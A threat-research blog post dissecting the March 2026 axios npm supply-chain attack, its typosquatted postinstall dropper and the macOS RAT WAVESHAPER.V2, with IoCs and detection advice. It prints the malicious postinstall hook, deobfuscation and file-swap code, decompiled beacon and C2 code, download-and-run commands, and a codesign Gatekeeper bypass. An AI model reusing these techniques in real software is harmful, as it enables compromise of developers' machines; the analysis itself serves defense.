---
layout: research-post
title: "Dissecting WAVESHAPER.V2: The macOS RAT Behind the Axios npm Attack"
date: 2026-06-06
categories: [Threat Research]
tags: [supply-chain, npm, macos, rat, north-korea, unc1069, malware-analysis]
toc: true
read_time: true
author: Sneh Bavarva
excerpt: "On March 31, 2026, a socially-engineered account takeover let North Korea's UNC1069 push two poisoned axios releases — 100M+ weekly downloads — that pulled in a typosquatted dependency whose postinstall hook (SILKBELL) dropped a cross-platform RAT. This is a ground-up reverse-engineering walkthrough of the dropper and the macOS second stage, WAVESHAPER.V2, cross-checked against Google GTIG, Datadog, Socket, and others."
---

## Executive Summary

On **March 31, 2026**, an attacker used a hijacked maintainer account to publish two malicious patch releases of [`axios`](https://thehackernews.com/2026/03/axios-supply-chain-attack-pushes-cross.html) — `1.14.1` (tagged `latest`, **100M+ weekly downloads**) and `0.30.4` (**~83M weekly downloads**), packages that sit beneath roughly **174,000 dependent packages**. The only meaningful change in each was a single added dependency: `"plain-crypto-js": "^4.2.1"` — a typosquat of the legitimate `crypto-js`, never imported by any real code. Any project that resolved one of the poisoned axios versions transitively pulled the malicious package, and its `postinstall` hook executed automatically — compromising the developer's machine before a single line of their own code ran.

The initial access was not a registry vulnerability. Per [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/axios-npm-supply-chain-compromise/), the operators **social-engineered the axios maintainer** (`DigitalBrainJS`) through a fake Slack workspace and a Microsoft Teams meeting impersonating a company founder, convinced him to run a RAT on his own system, harvested his npm credentials, and changed the account email to `ifstap@proton.me`.

The malicious package is a **cross-platform dropper** — Google's Threat Intelligence Group (GTIG) tracks the `setup.js` component as **SILKBELL**. It fingerprints the OS and stages a platform-specific second stage: Windows (VBScript + PowerShell), macOS (AppleScript → Mach-O implant), and Linux (Python). The macOS/Linux/Windows backdoor is **WAVESHAPER.V2** — an evolution of UNC1069's older WAVESHAPER that swapped a raw binary C2 protocol for Base64-encoded JSON and added richer host reconnaissance. On macOS it beacons every 60 seconds and exposes four command handlers, including in-memory binary execution with **ad-hoc code signing** to defeat Gatekeeper.

[Socket flagged the package within six minutes](https://socket.dev/blog/axios-npm-package-compromised) of publication, and the malicious releases were live for roughly three hours before npm pulled them and revoked tokens. In April 2026, [Google attributed the campaign](https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package) to **UNC1069**, a financially motivated North Korea-nexus actor active since at least 2018.

This post reconstructs the full chain from the source artifacts and cross-checks it against the public reporting: the account takeover, the typosquat delivery vehicle, the two-layer string obfuscation in SILKBELL, the per-OS execution branches (including two implementation bugs that crippled the implant), and a function-level breakdown of the macOS RAT. A MITRE ATT&CK mapping, a consolidated IoC table, and references close it out.

---

## Attack Timeline

All times UTC, March 31, 2026 unless noted.

| Time | Event |
|---|---|
| **Mar 30, 23:59** | `plain-crypto-js@4.2.1` published to npm; C2 domain `sfrclak[.]com` registered the same day |
| **00:21** | `axios@1.14.1` published, tagged `latest`, adding the `plain-crypto-js` dependency |
| **01:00** | `axios@0.30.4` published with the same dependency |
| **00:05–00:06** | [Socket's automated malware detection flags the package](https://socket.dev/blog/axios-npm-package-compromised) (~6 min after the `plain-crypto-js` publish) |
| **01:38** | Maintainer `DigitalBrainJS` opens a remediation pull request |
| **02:19–02:32** | Initial public compromise reports filed (subsequently deleted) |
| **03:25** | npm replaces `plain-crypto-js` with a security placeholder |
| **~03:40** | Compromised axios versions removed; tokens revoked. Total exposure window ≈ 3 hours |
| **Apr 2026** | [Google GTIG attributes the campaign to UNC1069](https://thehackernews.com/2026/04/google-attributes-axios-npm-supply.html); names the implant WAVESHAPER.V2 and the dropper SILKBELL |

> The sample analyzed here carries the hardcoded campaign identifier `6202033`, passed as the argument to SILKBELL's entry function and appended to every C2 request path (`…:8000/6202033`).

---

## Initial Access — Account Takeover via Social Engineering

The campaign did not begin on npm; it began in the maintainer's DMs. According to [Datadog](https://securitylabs.datadoghq.com/articles/axios-npm-supply-chain-compromise/), UNC1069 ran a **"Contagious Interview"-style** lure — a fabricated company, a fake Slack workspace, and a Microsoft Teams meeting impersonating a founder — to convince the axios maintainer to install software that was, in fact, a RAT. That foothold harvested the npm publishing credentials directly from the maintainer's machine.

With the credentials in hand, the attacker:

1. Changed the axios account email to `ifstap@proton.me` (and used `nrwise@proton.me` for the `plain-crypto-js` account), locking out recovery.
2. Published `axios@1.14.1` and `axios@0.30.4` with the typosquat dependency injected.

This is the part that should reframe how the industry thinks about "supply chain" defense: **no token leaked from a CI log, and no OIDC trust was misconfigured.** A human was phished, and a package with nine-figure weekly reach inherited the breach.

---

## The Delivery Vehicle: `plain-crypto-js`

The package masquerades as `crypto-js`, lifting the real project's `package.json` metadata wholesale — author `Evan Vosberg`, the `brix/crypto-js` homepage, and the full keyword list (`AES`, `SHA256`, `HMAC`, …). Two malicious versions were published — **`4.2.0` and `4.2.1`** — and the tell is in `scripts`:

```json
"scripts": {
  "test": "echo \"Error: no test specified\" && exit 1",
  "postinstall": "node setup.js"
}
```

The `postinstall` lifecycle hook runs `setup.js` (SILKBELL) automatically the moment `npm install` resolves the package — no import, no developer action required. That is the entire value of injecting a typosquatted crypto utility into the axios dependency tree: axios is pulled into millions of projects, and a `postinstall` payload converts "I depend on the most popular HTTP client" into remote code execution on the developer's workstation.

> **Decoy host note:** the dropper POSTs the string `packages.npm.org/product[0-2]` as a request body to its C2. `packages.npm.org` is **not** the real npm registry (`registry.npmjs.org`) — it is an attacker-chosen lure designed to blend into traffic logs.

---

## Stage 1 — SILKBELL, the Obfuscated Dropper (`setup.js`)

SILKBELL ships its entire configuration as an array of opaque strings (`stq`) decoded at runtime by two stacked transforms. Recovering them is the whole game.

### Two-layer string decoding

**Layer 1 — `_trans_2`** restores the obfuscated string to printable form in three steps:

1. **Reverse** the string.
2. **Restore Base64 padding** — replace `_` with `=`.
3. **Base64-decode** to UTF-8, then hand off to Layer 2.

**Layer 2 — `_trans_1`** is a *positional XOR* cipher keyed on the literal `"OrDeR_7077"`:

```js
const _trans_1 = function (x, r) {
  const E = r.split("").map(Number);            // key → digit array (letters → NaN)
  return x.split("").map((c, i) => {
    const S = c.charCodeAt(0),
          a = E[7 * i * i % 10];                 // pick a key digit by position
    return String.fromCharCode(S ^ a ^ 333);     // XOR char ^ keydigit ^ 333
  }).join("");
};
```

The key digit is selected by the index expression `7 * i² % 10`, and each character is XORed against that digit **and** the constant `333`. Because JavaScript bitwise ops coerce `NaN → 0`, the non-numeric characters of the key (`O r D e R _`) silently contribute zero. A faithful re-implementation of both layers recovers the config array cleanly:

```python
key = [int(c) if c.isdigit() else 0 for c in "OrDeR_7077"]

def decode(s):
    s = s[::-1].replace("_", "=")
    s = base64.b64decode(s + "===").decode("utf-8", "ignore")
    return "".join(chr(ord(ch) ^ key[(7 * i * i) % 10] ^ 333)
                   for i, ch in enumerate(s))
```

### Recovered configuration

Decoding every element of `stq` exposes the dropper's full intent:

| Index | Recovered value | Role |
|---|---|---|
| 00–02 | `child_process`, `os`, `fs` | Node modules loaded via obfuscated `require()` |
| 03 | `hxxp://sfrclak[.]com:8000/` | Primary C2 |
| 05 / 06 | `win32` / `darwin` | OS branch selectors |
| 07–08 | VBScript + `cscript … && del` | Windows execution + cleanup |
| 09–10 | AppleScript + `nohup osascript …` | macOS execution |
| 12 | `curl -o /tmp/ld.py … && nohup python3 …` | Linux execution |
| 13–14 | `package.json`, `package.md` | Anti-forensic file swap |
| 15–17 | `.exe`, `.ps1`, `.vbs` | Dropped artifact extensions |

The C2 (`stq[3]`) and the per-OS command templates are all that's needed to understand the kill chain.

### Per-OS execution branches

SILKBELL switches on `os.platform()` and stages a different payload for each target — and, notably, two of the three branches shipped with bugs that hobbled the implant on first run:

- **Windows** — copies the system `powershell.exe` to `%PROGRAMDATA%\wt.exe` (a renamed, "trusted-looking" interpreter to dodge tools that alert on `powershell.exe`), drops `%TEMP%\6202033.vbs` plus `%TEMP%\6202033.ps1`, and the VBScript runs the PowerShell via the renamed binary with `-w hidden -ep bypass`. It establishes **persistence** by writing `%PROGRAMDATA%\system.bat` and registering it under `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MicrosoftUpdate`. Per Datadog, a coding error means the RAT's `work()` function is **never called on first execution**, leaving it inert until the persistence entry re-launches it.
- **macOS** — writes an AppleScript dropper to `$TMPDIR/6202033`, downloads the second stage to **`/Library/Caches/com.apple.act.mond`** (a name impersonating a legitimate Apple daemon), `chmod 770`s it, and launches it detached via `/bin/zsh`, passing the C2 URL as `argv[1]`. There is **no built-in persistence** on macOS — re-infection relies on the implant staying resident.
- **Linux** — skips the script intermediary and `curl`s a Python loader to `/tmp/ld.py`, executing it with `nohup python3 /tmp/ld.py <C2> &`. Datadog notes the Linux variant calls `os.getlogin()`, which **throws in containers and CI runners** (no controlling terminal), aborting the beacon loop before it starts.

### Anti-forensics

After launching the stage-2, SILKBELL cleans up after itself: it `unlink`s its own file, deletes the real `package.json`, and **renames a decoy `package.md` to `package.json`**. A developer who later inspects the installed package finds a benign-looking manifest with no `postinstall` hook and no trace of the dropper.

```js
const K = __filename;
fs.unlink(K, () => {});                 // delete setup.js
fs.unlink("package.json", () => {});    // remove the manifest with the postinstall hook
fs.rename("package.md", "package.json", () => {});  // swap in a clean decoy
```

---

## Stage 2 — The macOS RAT (WAVESHAPER.V2)

The macOS second stage dropped to `com.apple.act.mond` is a 64-bit Mach-O written in C++ (vendors report a universal `x86_64 + arm64` binary; the slice analyzed here is `x86_64`).

| Property | Value |
|---|---|
| Magic | `0xfeedfacf` (Mach-O 64-bit) |
| Arch | `x86_64` (universal build also carries `arm64`) |
| Entry point | `0x7a60` |
| Flags | `PIE`, `DYLDLINK`, `BINDS_TO_WEAK`, `NOUNDEFS`, `TWOLEVEL` |

Its linked libraries telegraph the design: `libcurl.4.dylib` (HTTP C2), `libc++.1.dylib` (it's C++, not C), and `libSystem.B.dylib` (syscalls). Heavy use of `nlohmann::json` throughout confirms a structured JSON protocol.

### The beacon loop

`main()` is a textbook beaconing implant. It takes the C2 URL from `argv[1]` (handed in by the dropper), registers once, then heartbeats forever:

{% raw %}
```cpp
int main(int argc, const char **argv) {
    if (argc > 1) {
        char *c2_url = (char *)argv[1];

        GenerateUID(&uid, 16);          // 16-char random session ID
        GetOS(os_info);
        InitDirInfo(dir_info);

        // FirstInfo: one-time registration + directory snapshot
        json first_info = {{"type","FirstInfo"},{"uid",uid},
                           {"content",dir_info},{"os",os_string}};
        Report(c2_url, first_info.dump().c_str(), ...);

        while (true) {                  // BaseInfo heartbeat, every 60s
            GetHostname(...); GetUsername(...); GetProcessList(list, 1000);
            GetOSVersion(...); GetModel(...); GetCPUType(...);
            GetTimezone(...); GetBootTime(...);

            json base_info = {{"type","BaseInfo"},{"uid",uid},{"data",collected}};
            std::string response;
            if (Report(c2_url, base_info.dump().c_str(), &response))
                DoWork(uid, c2_url, response);   // dispatch C2 commands

            sleep(60);
        }
    }
}
```
{% endraw %}

Two message types: a **`FirstInfo`** registration carrying a 16-char session UID, OS string, and an initial directory listing — per Datadog the implant enumerates the home directory, `Desktop`, `Documents`, and `.config` (and on Windows, OneDrive/AppData and drive roots) — and a **`BaseInfo`** heartbeat sent every 60 seconds with a full host fingerprint: hostname, username, a process list of up to 1,000 entries, hardware model, CPU type, timezone, and boot time. Whenever the server returns data, `DoWork()` runs the requested command.

### `Report()` — the C2 transport

`Report()` is the single network chokepoint, and it leaves the cleanest fingerprint in the whole sample. It Base64-encodes the JSON, then POSTs it via libcurl:

```cpp
Base64Encode(payload);                                   // obfuscate body
curl_easy_setopt(h, CURLOPT_URL, c2_url);
curl_easy_setopt(h, CURLOPT_POST, 1);
curl_easy_setopt(h, CURLOPT_COPYPOSTFIELDS, b64_payload);
curl_easy_setopt(h, CURLOPT_USERAGENT,
    "mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)");  // spoofed IE8
curl_easy_setopt(h, CURLOPT_CONNECTTIMEOUT, 30);
curl_easy_setopt(h, CURLOPT_FOLLOWLOCATION, 1);
```

A macOS implant advertising itself as **Internet Explorer 8 on Windows XP** is a high-fidelity network IoC — and per Google, that exact hardcoded User-Agent is a WAVESHAPER.V2 signature reused across all three platform builds. The C2 resolved to `142.11.206.73` (Hostwinds).

### `DoWork()` — the command handlers

`DoWork()` parses the C2's JSON response and dispatches on `type`:

| Command | Behavior |
|---|---|
| `kill` | Graceful self-termination (kill switch) |
| `peinject` | Receives a Base64 binary → writes to `/private/tmp/.<random>` → **`codesign --force --deep --sign -`** → executes. The ad-hoc signature lets an unsigned payload run without a Gatekeeper "unidentified developer" prompt. |
| `runscript` | Decodes a Base64 AppleScript to `/tmp/.XXXXXX.scpt`, runs it via `/usr/bin/osascript`, then immediately `unlink`s the temp file |
| `rundir` | Enumerates one or more requested paths via `GetDetailedFileList()` (name, size, type, permissions, timestamps) and returns a JSON array — filesystem reconnaissance |

The `peinject` path is the most dangerous: it turns the implant into a generic loader for arbitrary follow-on tooling, while `codesign --force` quietly neutralizes the OS's primary trust check. Server replies are tagged `rsp_peinject`, `rsp_runscript`, `rsp_rundir` — useful detection strings.

### Tradecraft note: SIMD Base64

Rather than a static lookup table, the RAT builds its Base64 alphabet at runtime in `BuildBase64Alphabet()` using SSE2/SIMD (XMM) instructions. Functionally it's standard Base64 — but constructing the alphabet in registers keeps the string `ABCD…+/` out of the binary's static data, frustrating naive string-based detection. It's a small but deliberate anti-analysis flourish consistent with a maintained, professional toolset.

---

## Attribution — UNC1069 / WAVESHAPER.V2

The reverse-engineered behavior lines up point-for-point with the public attribution, which adds confidence beyond a single-sample analysis:

| Observed in this sample | Corroborating reporting |
|---|---|
| C++ implant, `nlohmann::json` protocol, 60-second beacon | [Google GTIG: WAVESHAPER.V2 "communicates using JSON … beacons every 60 seconds"](https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package) |
| Hardcoded IE8-on-XP User-Agent reused across platforms | Same — described as a WAVESHAPER.V2 signature |
| macOS + Linux + Windows stages from one dropper (SILKBELL) | [Tenable FAQ](https://www.tenable.com/blog/faq-about-the-axios-npm-supply-chain-attack-by-north-korea-nexus-threat-actor-unc1069); [The Hacker News](https://thehackernews.com/2026/04/google-attributes-axios-npm-supply.html) |
| `plain-crypto-js` typosquat injected into axios; social-engineered account takeover | [Resecurity](https://www.resecurity.com/blog/article/supply-chain-malware-alert-plain-crypto-js-compromises-axios-packages); [Datadog Security Labs](https://securitylabs.datadoghq.com/articles/axios-npm-supply-chain-compromise/) |

Google assesses **UNC1069** as a financially motivated North Korea-nexus actor active since at least 2018, with a history of targeting the software-development and cryptocurrency ecosystems via "Contagious Interview"-style social engineering. Infrastructure analysis tied the operation to an **AstrillVPN** node and an ASN historically linked to the group. WAVESHAPER.V2 is a direct evolution of the earlier WAVESHAPER macOS/Linux backdoor, upgraded from a raw binary C2 protocol to the JSON scheme dissected above.

The implant build also leaked operator OPSEC artifacts that reinforce the attribution and the hands-on-keyboard nature of the campaign: an Xcode project named `macWebT`, a developer account `mac`, and the build path `/Users/mac/Desktop/Jain_DEV/client_mac/macWebT/`.

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Initial Access | Supply Chain Compromise: Compromise Software Supply Chain | T1195.002 |
| Initial Access / Resource Dev | Impersonation; Phishing | T1656; T1566 |
| Execution | Command and Scripting Interpreter (PowerShell / AppleScript / Python / Visual Basic) | T1059.001/.002/.006/.005 |
| Persistence | Boot or Logon Autostart: Registry Run Keys | T1547.001 |
| Defense Evasion | Obfuscated Files or Information; Deobfuscate/Decode | T1027; T1140 |
| Defense Evasion | Subvert Trust Controls: Code Signing (ad-hoc `codesign`) | T1553.002 |
| Defense Evasion | Masquerading (`wt.exe`, `com.apple.act.mond`) | T1036 |
| Defense Evasion | Indicator Removal: File Deletion | T1070.004 |
| Discovery | System Information / File & Directory / Process Discovery | T1082; T1083; T1057 |
| Command & Control | Application Layer Protocol: Web Protocols | T1071.001 |
| Command & Control | Data Encoding: Standard Encoding (Base64) | T1132.001 |

---

## Detection & Hardening

Full YARA/Sigma/KQL rules are out of scope for this writeup, but the highest-signal behaviors to monitor and the practical mitigations are:

- **Block the network IoCs.** Alert on any connection to `sfrclak[.]com`, `142.11.206.73`, or port `8000`, and on outbound HTTP carrying the spoofed `msie 8.0; … trident/4.0` User-Agent from a non-Windows host.
- **Watch the dropped paths.** `/Library/Caches/com.apple.act.mond`, `/tmp/ld.py`, `%PROGRAMDATA%\wt.exe`, `%PROGRAMDATA%\system.bat`, and `/tmp/.*.scpt` are all anomalous in normal operation.
- **Flag `codesign --force --deep --sign -`** spawned by a process running out of `/private/tmp/.*` — ad-hoc signing of a freshly-dropped binary is a strong macOS execution signal.
- **Hunt the static strings:** `packages.npm.org/product[0-2]`, the obfuscation key `OrDeR_7077`, the XOR construction `String.fromCharCode(S^a^333)`, and the response tags `rsp_peinject` / `rsp_runscript` / `rsp_rundir`.
- **Version hygiene:** avoid `axios@1.14.1` and `axios@0.30.4` (use `1.14.0` / `0.30.3` or earlier); grep lockfiles for `plain-crypto-js` (`4.2.0`–`4.2.1`); clear npm/yarn/pnpm caches.
- **Neutralize the root cause in CI/dev:** run `npm ci --ignore-scripts` to suppress `postinstall` hooks, pin exact versions with a lockfile, and prefer ephemeral containers over developer laptops. A package that adds a crypto dependency it never imports is, by itself, worth a hard stop in review.
- **Rotate credentials** on any workstation that installed the affected versions during the exposure window — assume the host fingerprint, process list, and any data reachable by `rundir`/`runscript` were exfiltrated. And remember the entry point here was a **phished human**, not a leaked token: treat maintainer social-engineering as an in-scope supply-chain threat.

---

## Indicators of Compromise

All network indicators defanged.

| Type | Indicator | Notes |
|---|---|---|
| npm package | `plain-crypto-js@4.2.0`, `@4.2.1` | Typosquat of `crypto-js`; payload carrier |
| npm package | `axios@1.14.1`, `axios@0.30.4` | Compromised releases that pulled the dependency |
| SHA-256 (tgz) | `58401c195fe0a6204b42f5f90995ece5fab74ce7c69c67a24c61a057325af668` | `plain-crypto-js-4.2.1.tgz` |
| SHA-256 (dropper) | `e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09` | `setup.js` (SILKBELL) |
| SHA-256 (macOS stage-2) | `92ff08773995ebc8d55ec4b8e1a225d0d1e51efa4ef88b8849d0071230c9645a` | `com.apple.act.mond` (WAVESHAPER.V2) — confirmed by Google & Datadog¹ |
| SHA-256 (Windows stage-1) | `617b67a8e1210e4fc87c92d1d1da45a2f311c08d26e89b12307cf583c900d101` | WAVESHAPER.V2 Windows |
| SHA-256 (Linux Python) | `fcb81618bb15edfdedfb638b4c08a2af9cac9ecfa551af135a8402bf980375cf` | WAVESHAPER.V2 Linux loader |
| SHA-256 (persistence) | `f7d335205b8d7b20208fb3ef93ee6dc817905dc3ae0c10a0b164f4e7d07121cd` | `system.bat` (Windows) |
| Domain / C2 | `sfrclak[.]com` | Port `8000`; registered 2026-03-30; callback `hxxp://sfrclak[.]com:8000/6202033` |
| C2 IP | `142.11.206.73` | Hostwinds |
| Suspected infra IP | `23.254.167.216` | Suspected UNC1069 infrastructure |
| Decoy string | `packages.npm.org/product[0-2]` | POST body lure (not the real registry) |
| Campaign ID | `6202033` | Appended to C2 request path; used as VBS/PS filename |
| Attacker emails | `ifstap@proton.me` (axios), `nrwise@proton.me` (plain-crypto-js) | Account-takeover email swaps |
| File (macOS) | `/Library/Caches/com.apple.act.mond`; `$TMPDIR/6202033` (AppleScript) | Stage-2 implant + dropper |
| File (macOS) | `/private/tmp/.<random>`, `/tmp/.XXXXXX.scpt` | `peinject` / `runscript` temp artifacts |
| File (Linux) | `/tmp/ld.py` | Python loader |
| File (Windows) | `%PROGRAMDATA%\wt.exe`, `%PROGRAMDATA%\system.bat`, `%TEMP%\6202033.vbs`, `%TEMP%\6202033.ps1` | Renamed PowerShell, persistence, launchers |
| Registry (Windows) | `HKCU\…\CurrentVersion\Run\MicrosoftUpdate` | Logon persistence |
| User-Agent | `mozilla/4.0 (compatible; msie 8.0; windows nt 5.1; trident/4.0)` | Spoofed IE8; reused across all platform builds |
| Build artifact | Xcode project `macWebT`; path `/Users/mac/Desktop/Jain_DEV/client_mac/macWebT/` | Operator OPSEC leak |
| Behavior | `codesign --force --deep --sign -` on a `/private/tmp/.*` file | Ad-hoc signing to bypass Gatekeeper |
| Behavior | `osascript` executing scripts from `/tmp`; `ps -eo` enumeration | C2 command handlers |

¹ The original sample-analysis notes also recorded `506690fcbd10fbe6f2b85b49a1fffa9d984c376c25ef6b73f764f670e932cab4` against the Mach-O header. That value is **not** corroborated by vendor reporting (which uniformly cites `92ff08…`) and may correspond to a single architecture slice of the universal binary; treat `92ff08…` as authoritative.

---

## References

1. Google Cloud / GTIG — [North Korea-Nexus Threat Actor Compromises Widely Used Axios npm Package](https://cloud.google.com/blog/topics/threat-intelligence/north-korea-threat-actor-targets-axios-npm-package)
2. Datadog Security Labs — [Compromised axios npm package delivers cross-platform RAT](https://securitylabs.datadoghq.com/articles/axios-npm-supply-chain-compromise/)
3. Socket — [Supply Chain Attack on Axios Pulls Malicious Dependency](https://socket.dev/blog/axios-npm-package-compromised)
4. The Hacker News — [Google Attributes Axios npm Supply Chain Attack to UNC1069](https://thehackernews.com/2026/04/google-attributes-axios-npm-supply.html)
5. The Hacker News — [Axios Supply Chain Attack Pushes Cross-Platform RAT](https://thehackernews.com/2026/03/axios-supply-chain-attack-pushes-cross.html)
6. Tenable — [FAQ About the Axios npm Supply Chain Attack by UNC1069](https://www.tenable.com/blog/faq-about-the-axios-npm-supply-chain-attack-by-north-korea-nexus-threat-actor-unc1069)
7. Resecurity — [Supply Chain Malware Alert: plain-crypto-js Compromises Axios Packages](https://www.resecurity.com/blog/article/supply-chain-malware-alert-plain-crypto-js-compromises-axios-packages)
8. Endor Labs — [Axios compromised: hijacked maintainer account pushes malicious npm versions](https://www.endorlabs.com/learn/npm-axios-compromise)
9. Security Affairs — [Google links Axios npm supply chain attack to UNC1069](https://securityaffairs.com/190256/security/google-links-axios-npm-supply-chain-attack-to-north-korea-linked-apt-unc1069.html)
